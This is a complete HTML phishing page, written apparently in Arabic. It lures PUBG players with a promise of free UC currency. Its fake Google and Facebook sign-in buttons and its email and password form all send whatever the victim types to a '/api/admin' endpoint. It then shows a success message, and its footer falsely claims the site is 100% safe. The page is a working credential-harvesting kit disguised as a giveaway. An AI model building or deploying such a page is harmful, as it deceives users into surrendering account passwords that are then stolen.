<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>PUBG UC FREE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Anton&family=Cairo:wght@400;700;900&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
    background: url('https://i.imgur.com/QYvYg5k.jpg') no-repeat center center fixed;
    background-size: cover;
    font-family: 'Cairo', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
}

/* طبقة التعتيم */
body::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.6);
}

.login-card {
    position: relative;
    background: linear-gradient(180deg, rgba(10,15,30,0.9), rgba(0,0,0,0.9));
    backdrop-filter: blur(20px);
    border: 2px solid #FFD700;
    border-radius: 25px;
    padding: 35px 30px;
    width: 440px;
    text-align: center;
    box-shadow: 0 0 40px rgba(255, 215, 0, 0.5), inset 0 0 20px rgba(255,215,0,0.1);
    animation: fadeIn 1s ease;
    z-index: 2;
}
@keyframes fadeIn { from {opacity:0; transform: translateY(30px);} to {opacity:1; transform: translateY(0);} }

.logo {
    font-family: 'Anton', sans-serif;
    font-size: 50px;
    color: #FFD700;
    text-shadow: 0 0 15px #FFD700, 0 0 30px #FFD700;
    margin-bottom: 15px;
    animation: glow 2s ease-in-out infinite alternate;
}
@keyframes glow {
    from { text-shadow: 0 0 10px #FFD700; }
    to { text-shadow: 0 0 20px #FFD700, 0 0 40px #FFD700; }
}
.logo span { color: white; font-size: 30px; display: block; margin-top: -10px; }

h2 { font-size: 28px; margin-bottom: 5px; font-weight: 900; }
.subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }

.btn {
    display: flex; align-items: center; justify-content: center;
    width: 100%; padding: 13px; border-radius: 12px;
    font-size: 16px; font-weight: bold; cursor: pointer;
    margin: 12px 0; border: none; font-family: 'Cairo';
    transition: 0.3s;
}
.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
.google-btn { background: white; color: black; }
.fb-btn { background: linear-gradient(90deg, #1877f2, #0a66e2); color: white; }
.btn img { width: 22px; height: 22px; margin-left: 10px; }

.divider { display: flex; align-items: center; color: #777; margin: 20px 0; font-weight: bold; }
.divider hr { flex: 1; border: none; border-top: 1px solid #444; }
.divider span { margin: 0 15px; }

.input-box {
    position: relative; margin: 15px 0;
}
.input-box input {
    width: 100%; padding: 14px 45px 14px 14px;
    background: rgba(0,0,0,0.5); border: 2px solid #333;
    border-radius: 12px; color: white; font-size: 15px;
    font-family: 'Cairo'; transition: 0.3s;
}
.input-box input:focus { outline: none; border-color: #FFD700; box-shadow: 0 0 15px rgba(255,215,0,0.3); }
.input-box .icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px; color: #FFD700; }

.login-btn {
    width: 100%; padding: 15px;
    background: linear-gradient(90deg, #FFD700, #FFA500);
    border: none; border-radius: 12px;
    font-size: 18px; font-weight: 900;
    color: black; cursor: pointer; margin-top: 15px;
    transition: 0.3s;
    font-family: 'Cairo';
}
.login-btn:hover { 
    transform: translateY(-2px); 
    box-shadow: 0 0 25px #FFD700; 
}

.footer-text {
    margin-top: 20px;
    font-size: 12px;
    color: #666;
}
</style>
</head>
<body>
    <div class="login-card">
        <div class="logo">PUBG <span>UC FREE</span></div>

        <h2>تسجيل الدخول 🪖</h2>
        <p class="subtitle">سجل دخولك للوصول إلى جميع خدمات الموقع</p>

        <button class="btn google-btn" onclick="register()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c1/Google_%22G%22_logo.svg" alt="G">
            تسجيل الدخول بواسطة Google
        </button>

        <button class="btn fb-btn" onclick="register()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="f">
            تسجيل الدخول بواسطة Facebook
        </button>

        <div class="divider"><hr><span>أو</span><hr></div>

        <div class="input-box">
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <span class="icon">✉️</span>
        </div>

        <div class="input-box">
            <input type="password" id="password" placeholder="كلمة المرور">
            <span class="icon">🔒</span>
        </div>

        <button class="login-btn" onclick="register()">تسجيل الدخول ➡️</button>
        
        <p class="footer-text">🔒 آمن 100% • سريع • مجاني</p>
    </div>

<script>
async function register() {
    const id = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if(!id || !password){
        alert("لازم تملا الايميل والباسورد");
        return;
    }
    
    try {
        const res = await fetch('/api/admin', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({id, password})
        });

        if(res.ok) {
            alert("✅ تم التسجيل بنجاح");
            document.getElementById('email').value = "";
            document.getElementById('password').value = "";
        } else {
            alert("❌ فشل التسجيل");
        }
    } catch (e) {
        alert("خطأ في الاتصال بالسيرفر");
    }
}
</script>
</body>
</html>
